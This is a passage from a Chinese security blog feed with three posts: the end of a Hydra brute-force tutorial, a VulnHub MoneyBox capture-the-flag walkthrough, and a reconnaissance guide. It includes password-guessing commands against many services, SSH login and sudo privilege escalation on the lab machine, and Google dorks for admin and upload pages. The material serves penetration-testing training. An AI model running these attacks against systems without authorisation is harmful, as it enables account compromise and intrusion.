反向，把用户名倒叙，当做密码进行尝试。</li></ul></li><li><p>-vV 显示执行细节</p></li><li><p>-o 保存执行结果</p></li><li><p>-s 指定非默认端口</p></li><li><p>-M 指定破解的目标文件，如果不是默认端口，后面跟上“:port”</p></li><li><p>-t 指定爆破时的任务数量（默认16）</p></li></ul><h5><span id="3查看参数版本等信息">3，查看参数版本等信息</span></h5><p>在kali中打开终端，直接输入hydra，可以看到hydra的版本、参数、以及可以爆破的协议。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072020428.png" alt="image-20240107202017242"></p><p>从图中圈起来的地方可以看到，hydra可以爆破 http、ftp、mysql等多种协议。</p><h5><span id="4爆破ssh">4，爆破SSH</span></h5><p>用 -l 参数指定用户名，-p参数指定密码，后面直接跟目标的IP地址和协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -p 12345678 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p>成功的话，会把账号和密码高亮显示出来。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072021839.png" alt="image-20240107202132763"></p><p>也可以使用另外一种格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -p 12345678 ssh://192.168.31.173</span><br></pre></td></tr></table></figure><p>执行的结果都是一样的。</p><p>这里主要简单介绍一下用法，很多时候，我们是不知道密码的，所以就要使用密码字典来爆破。</p><h5><span id="5使用字典爆破">5，使用字典爆破</span></h5><p>小写的 -p 是指定密码，大写的 -P是指定字典文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P 密码字典 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p>1）我们先准备一个简单的密码字典，创建一个 pwd.txt 文件，在里面输入几个简单的密码：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072023152.png" alt="image-20240107202334710"></p><p>2）然后指定这个密码字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P pwd.txt 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p>可以看到爆破成功了，但只给了一个结果：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072024712.png" alt="image-20240107202412543"></p><p>3）如果想看爆破的过程，可以加上 -vV参数，显示执行细节：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P pwd.txt 192.168.31.173 ssh -vV</span><br></pre></td></tr></table></figure><p>我们的密码字典中有三个密码，它也会执行三次，并把执行过程列了出来。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072024456.png" alt="image-20240107202453427"></p><p>4）上面的密码字典使用的是相对路径，我们也可以把它换成绝对路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /root/pwd.txt 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072025116.png" alt="image-20240107202524829"></p><p>SSH协议的默认用户是 root，所以上面我们都是指定的用户名，如果不确定用户名，就要指定用户名字典，比如下面这种格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/usr.txt -P /root/pwd.txt 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p>爆破其他协议服务时，把协议名和默认用户名换一下就可以了。</p><h5><span id="6hydra爆破常见服务">6，Hydra爆破常见服务</span></h5><p>远程桌面（RDP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 rdp</span><br></pre></td></tr></table></figure><p>共享文件（SMB）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 smb</span><br></pre></td></tr></table></figure><p>文件传输（FTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 ftp</span><br></pre></td></tr></table></figure><p>邮箱协议（POP3）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 pop3</span><br></pre></td></tr></table></figure><p>MSSQL数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l sa -P 密码字典 192.168.31.173 mssql</span><br></pre></td></tr></table></figure><p>MySQL数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 mysql</span><br></pre></td></tr></table></figure><p>Oracle数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 oracle</span><br></pre></td></tr></table></figure><p>Redis数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 redis</span><br></pre></td></tr></table></figure><br><br><br><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;目录&quot;&gt;目录:&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;&amp;emsp;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;br&gt;&amp;emsp;&amp;emsp;&lt;strong&gt;1，PHPstudy创建一个新网站&lt;/strong&gt;&lt;br&gt;&amp;emsp;&amp;emsp;&lt;strong&gt;2，下</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十四，vulnhub-MONEYBOX: 1</title>
    <link href="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%8Cvulnhub-MONEYBOX-1/"/>
    <id>http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%8Cvulnhub-MONEYBOX-1/</id>
    <published>2024-01-04T12:38:29.000Z</published>
    <updated>2024-01-04T13:51:50.585Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="搭建环境">搭建环境</span></h4><h5><span id="1下载oracle-vm-virtualbox">1，下载Oracle VM VirtualBox</span></h5><p>下载地址：<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><h5><span id="2下载靶机vulnhub-moneybox-1">2，下载靶机vulnhub-MONEYBOX: 1</span></h5><p>下载地址：<a href="http://www.vulnhub.com/entry/moneybox-1,653/#download">http://www.vulnhub.com/entry/moneybox-1,653/#download</a></p><h5><span id="3安装配置">3，安装配置</span></h5><p>点击管理—-》导入虚拟电脑—-》选择靶机的MoneyBox.ova文件—-》下一步—-》导入</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042044093.png" alt="image-20240104204421298"></p><p>右键虚拟机—-》设置—-》USB设备—-》选择USB 1.1控制器</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042045734.png" alt="image-20240104204504640"></p><p>点击网络—-》将连接方式改为仅主机网络—-》选择默认的界面名称—》记住MAC地址</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042046617.png" alt="image-20240104204646397"></p><p>打开VMware—-》点击编辑—-》虚拟网络编辑器—-》更改设置—-》选择桥接模式—-》改为VirtualBox Host-Only模式</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042049124.png" alt="image-20240104204949544"></p><p>打开CTF虚拟器和kali虚拟机</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042051748.png" alt="image-20240104205158324"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042053178.png" alt="image-20240104205337342"></p><hr><h4><span id="做题步骤">做题步骤</span></h4><h5><span id="1获取靶机的ip">1，获取靶机的IP</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig获取kali的IP</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042059315.png" alt="image-20240104205943848"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.56.103/24获取局域网内存活的IP与靶机的mac地址对比便可获得靶机的IP</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042105902.png" alt="image-20240104210549560"></p><h5><span id="2扫描靶机的端口">2，扫描靶机的端口</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-1000 192.168.56.101</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042107489.png" alt="image-20240104210745149"></p><p>可以看出靶机开放了21，22，80端口，测试这几个端口有没有漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 21,22,80 -sC 192.168.56.101</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042109558.png" alt="image-20240104210948264"></p><p>发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous可登录，并且还有一个图片：trytofind.jpg</p><h5><span id="3在80端口寻找线索">3，在80端口寻找线索</span></h5><p>浏览器打开IP</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042112799.png" alt="image-20240104211212350"></p><p>找不到东西，目录爆破试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.56.101&quot;  -x403,404,401</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042114703.png" alt="image-20240104211425548"></p><p>找到一个blogs页面，打开在源代码中看到线索还有个页面</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042116995.png" alt="image-20240104211630460"></p><p>打开该页面，检测页面源代码发现一个密钥，暂时还看不出在哪里用</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042117996.png" alt="image-20240104211746618"></p><h5><span id="4登录ftp对图片进行检查">4，登录ftp，对图片进行检查</span></h5><p>刚扫描端口时发现有ftp的匿名登录漏洞，尝试登录一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br><span class="line">用户名：Anonymous</span><br><span class="line">密码：Anonymous</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042121944.png" alt="image-20240104212103592"></p><p>help查看一下有哪些命令</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042122457.png" alt="image-20240104212225318"></p><p>发现有ls命令，查看一下有哪些文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042123985.png" alt="image-20240104212346879"></p><p>发现只有一张图片trytofind.jpg，刚上面还发现了有get命令，将图片下载下来</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042125433.png" alt="image-20240104212523207"></p><p>查看图片</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042128343.png" alt="image-20240104212856995"></p><p>发现看不出什么信息，可以用steghide查看一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info trytofind.jpg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042131965.png" alt="image-20240104213152418"></p><p>这里让输入密钥，刚刚找出的密钥应该就是用在这里</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042133927.png" alt="image-20240104213315451"></p><p>发现这张图片中藏了一个data.txt文件，分离出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide  extract -sf trytofind.jpg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042135656.png" alt="image-20240104213509564"></p><p>可以看出靶机的名称为renu</p><h5><span id="5对靶机进行ssh密码爆破">5，对靶机进行ssh密码爆破</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l renu -P 1.txt 192.168.56.101 ssh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042136391.png" alt="image-20240104213650338"></p><p>爆破出密码进行ssh远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh renu@192.168.56.101</span><br><span class="line">987654321</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042138632.png" alt="image-20240104213759528"></p><p>登录成功，查看有哪些文件，寻找flag</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042139641.png" alt="image-20240104213903358"></p><p>成功拿到第一个flag</p><h5><span id="6查看历史命令寻找flag线索">6，查看历史命令，寻找flag线索</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042140374.png" alt="image-20240104214045043"></p><p>通过历史命令可以看出，曾经登录过lily用户，我们也尝试登录一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lily@192.168.56.101</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042145871.png" alt="image-20240104214522004"></p><p>也是能够成功登录，查看有哪些文件，找到第二个flag</p><h5><span id="7提权寻找第三个flag">7，提权，寻找第三个flag</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>发现可以sudo来运行perl</p><p>在<a href="https://gtfobins.github.io/%E7%BD%91%E9%A1%B5%E4%B8%AD%E6%89%BE%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%91%BD%E4%BB%A4">https://gtfobins.github.io/网页中找到提权的命令</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042148982.png" alt="image-20240104214811854"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042151657.png" alt="image-20240104215102182"></p><p>成功找到第三个flag</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;搭建环境&quot;&gt;搭建环境&lt;/span&gt;&lt;/h4&gt;&lt;h5&gt;&lt;span id=&quot;1下载oracle-vm-virtualbox&quot;&gt;1，下载Oracle VM VirtualBox&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://www.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十三，信息收集</title>
    <link href="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2024-01-04T11:33:14.000Z</published>
    <updated>2024-01-08T06:56:34.153Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="简介">简介</span></h4><p>渗透的本质是信息收集，信息收集也叫做资产收集</p><p>信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感&#x2F;目录文件、开放端口和中间件信息等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。</p><h4><span id="信息收集的分类">信息收集的分类</span></h4><p>1，服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</p><p>2，网站指纹识别（包括，cms，cdn，证书等） dns记录</p><p>3，whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p><p>4，子域名收集，旁站，C段等</p><p>5，google hacking针对化搜索，word&#x2F;电子表格&#x2F;pdf文件，中间件版本，弱口令扫描等</p><p>6，扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</p><p>7，传输协议，通用漏洞，exp，github源码等</p><h4><span id="常见的查询方法">常见的查询方法</span></h4><h5><span id="1whois查询">1，whois查询</span></h5><p>whois是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、联系邮箱、联系电话、更新时间、创建时间、过期时间、域名服务器、DNS等等），不同域名后缀的Whois信息需要到不同的Whois数据库查询。</p><p>微步在线：<a href="https://x.threatbook.com/">https://x.threatbook.com/</a></p><p>站长之家域名WHOIS信息查询地址 <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站网域名WHOIS信息查询地址 <a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址 <a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>美橙互联域名WHOIS信息查询地址 <a href="https://whois.cndns.com/">https://whois.cndns.com/</a></p><p>爱名网域名WHOIS信息查询地址 <a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a></p><p>易名网域名WHOIS信息查询地址 <a href="https://whois.ename.net/">https://whois.ename.net/</a></p><p>中国万网域名WHOIS信息查询地址 <a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p><h5><span id="2在线网站备案查询">2，在线网站备案查询</span></h5><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询</p><p>天眼查<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>爱站备案查询<a href="https://icp.aizhan.com/">https://icp.aizhan.com/</a></p><p>域名助手备案信息查询<a href="http://cha.fute.com/index">http://cha.fute.com/index</a></p><h5><span id="3查询真实主机ip">3，查询真实主机IP</span></h5><p>因为许多大型的网站都有CDN服务，要查询确认源站主机的IP，主要是通过全球ping和国外ping来实现，基本上国外大多数相同的地址就是主机的IP地址，确认IP后可以在最后一位进行10以内的加减来寻找临近IP资产</p><p>站长之家ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p>ITDOG的ping：<a href="https://www.itdog.cn/ping/baidu.com">https://www.itdog.cn/ping/baidu.com</a></p><p>IPIP的ping：<a href="https://tools.ipip.net/ping.php">https://tools.ipip.net/ping.php</a></p><h5><span id="4收集子域名">4，收集子域名</span></h5><p>收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。</p><p>子域名在线爆破：<a href="http://z.zcjun.com/">http://z.zcjun.com/</a></p><p>Layer子域名挖掘机</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042006444.png" alt="image-20240104200642598"></p><p>空间探测：</p><p>fofa:<a href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p><p>360:<a href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></p><p>奇安信：<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><p>钟馗之眼：<a href="https://www.zoomeye.org/business">https://www.zoomeye.org/business</a></p><p>shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p>CensysSearch:<a href="https://search.censys.io/">https://search.censys.io/</a></p><p>谷歌hacking：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">intext： 寻找正文中含有关键字的网页，例如：intext：后台登陆 将只返回正文中包含后台登陆的wang网页。</span><br><span class="line"></span><br><span class="line">intitle： 寻找标题中含有关键字的网页，例如：intitle：后台登陆 密码 将返回标题中包含黑客而正文中包含中国的网页。</span><br><span class="line"></span><br><span class="line">allintitle： 用法和intitle类似，只不过可以指定多个词，例如：alltitle：后台登陆 管理员 将返回标题中包含后台登陆和管理员的网页。</span><br><span class="line"></span><br><span class="line">cache: 网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:www.hackingspirits.com guest ，将返回指定网站的缓存，并且正文中含有guest</span><br><span class="line"></span><br><span class="line">inurl： 将返回url中含有关键词的网页,例如：inurl：Login 将返回url中含有Login的网页。</span><br><span class="line"></span><br><span class="line">inininurl：//admin/login.php 查找管理员登陆页面</span><br><span class="line"></span><br><span class="line">nurl:/phpmyadmin/index.php 查找后台数据库管理页面</span><br><span class="line"></span><br><span class="line">allinurl 用法和inurl类似，只不过可以指定多个词，例如：inrul:Login admin 将返回url中含有Login和admin的网页。</span><br><span class="line"></span><br><span class="line">site 指定访问的站点，例如：site:baidu.com inurl:Login 将只在baidu.com中查找url中含有Login的网页。</span><br><span class="line"></span><br><span class="line">filetype 指定访问的文件类型，例如:site:baidu.com filetype:pdf 将只fan返回baidu.com站点上文件类型为pdf的网页。</span><br><span class="line"></span><br><span class="line">link 指定链接的网页，例如：link:www.baidu.com 将返回所有包含指向www.baidu.com的网页。</span><br><span class="line"></span><br><span class="line">info 返回站点的指定信息，例如：info:www.baidu.com 将返回百度的一些信息。</span><br><span class="line"></span><br><span class="line">Index  of   可以帮助你寻找网络和FTP目录  例如：index  of mp3</span><br><span class="line"></span><br><span class="line">查找网站后台：</span><br><span class="line"></span><br><span class="line">site:xxx.com intext:管理</span><br><span class="line"></span><br><span class="line">site:xxx.com inurl:login</span><br><span class="line"></span><br><span class="line">site:xxx.com intitle:后台</span><br><span class="line"></span><br><span class="line">查看服务器使用的程序：</span><br><span class="line"></span><br><span class="line">site:xxx.com filetype:asp</span><br><span class="line"></span><br><span class="line">site:xxx.com filetype:php</span><br><span class="line"></span><br><span class="line">site:xxx.com filetype:jsp</span><br><span class="line"></span><br><span class="line">site:xxx.com filetype:aspx</span><br><span class="line"></span><br><span class="line">查看上传漏洞：</span><br><span class="line"></span><br><span class="line">site:xxx.com inurl:file</span><br><span class="line"></span><br><span class="line">site:xxx.com inurl:load</span><br></pre></td></tr></table></figure><h5><span id="5端口扫描">5，端口扫描</span></h5><p>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。</p><p>在线端口扫描：<a href="http://www.all-tool.cn/Tools/portblast/">http://www.all-tool.cn/Tools/portblast/</a></p><p>​<a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p>nmap扫描端口和探测端口信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -sT 92.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -Pn -A -sC 192.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -sU -sT -p0-65535 192.168.122.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用于扫描目标主机服务版本号与开放的端口</p><p>如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL ip.txt</span><br></pre></td></tr></table></figure><p>来扫描列表中所有的ip。</p><p>Nmap为端口探测最常用的方法，操作方便，输出结果非常直观。</p><p>常见的端口和攻击方法</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042019174.png" alt="image-20240104201950814" style="zoom:150%;"><h5><span id="6扫描敏感目录x2f文件">6，扫描敏感目录&#x2F;文件</span></h5><p>扫描敏感目录需要强大的字典，需要平时积累，拥有强大的字典能够更高效地找出网站的管理后台，敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等，这一步一半交给各类扫描器就可以了，将目标站点输入到域名中，选择对应字典类型，就可以开始扫描了，十分方便。</p><p>dirsearch</p><p>下载地址：<a href="https://gitee.com/Abaomianguan/dirsearch.git">https://gitee.com/Abaomianguan/dirsearch.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://m.scabjd.com/ -e *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042024201.png" alt="image-20240104202457984"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042025881.png" alt="image-20240104202506813"></p><p>御剑</p><p>下载地址：<a href="https://www.fujieace.com/hacker/tools/yujian.html">https://www.fujieace.com/hacker/tools/yujian.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042026738.png" alt="image-20240104202640356"></p><h5><span id="7指纹识别cms">7，指纹识别（CMS）</span></h5><p>1.什么是指纹（CMS）<br>CMS：快速搭建网站的内容管理系统，系统模板</p><p>Web应用框架：快速二次开发的Web应用框架，例如网站，小程序</p><p>2.指纹识别的方式<br>云溪在线指纹识别： <a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></p><p>Whatweb： <a href="http://www.whatweb.net/">http://www.whatweb.net</a></p><p>潮汐指纹: <a href="http://finger.tidesec.net/">http://finger.tidesec.net</a></p><p>插件: wappalyzer <a href="https://www.wappalyzer.com/">https://www.wappalyzer.com</a> 非常好用，可以直接插件搜索</p><p>脚本： CMSeek <a href="https://github.com/Tuhinshubhra/CMSeek">https://github.com/Tuhinshubhra/CMSeek</a></p><p>Webfinger <a href="https://github.com/se55i0n/Webfinger">https://github.com/se55i0n/Webfinger</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042030416.png" alt="image-20240104203007845"></p><br><br><h4><span id="小米范的使用">小米范的使用</span></h4><p>将下载好的jar文件（小米范）拖拽到jdk8的bin目录下</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401081454784.png" alt="image-20240108145409693"></p><p>然后在bin目录下打开cmd</p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar &quot;web finder 2.9.jar&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401081455193.png" alt="image-20240108145511115"></p><p>然后新建扫描，将ip地址放入里面（一个ip一行）</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401081455746.png" alt="image-20240108145539672"></p><p>根据ssl、状态码以及下方的显示判断当前ip是否可以访问</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401081455687.png" alt="image-20240108145558590"></p><br><br><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;简介&quot;&gt;简介&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;渗透的本质是信息收集，信息收集也叫做资产收集&lt;/p&gt;
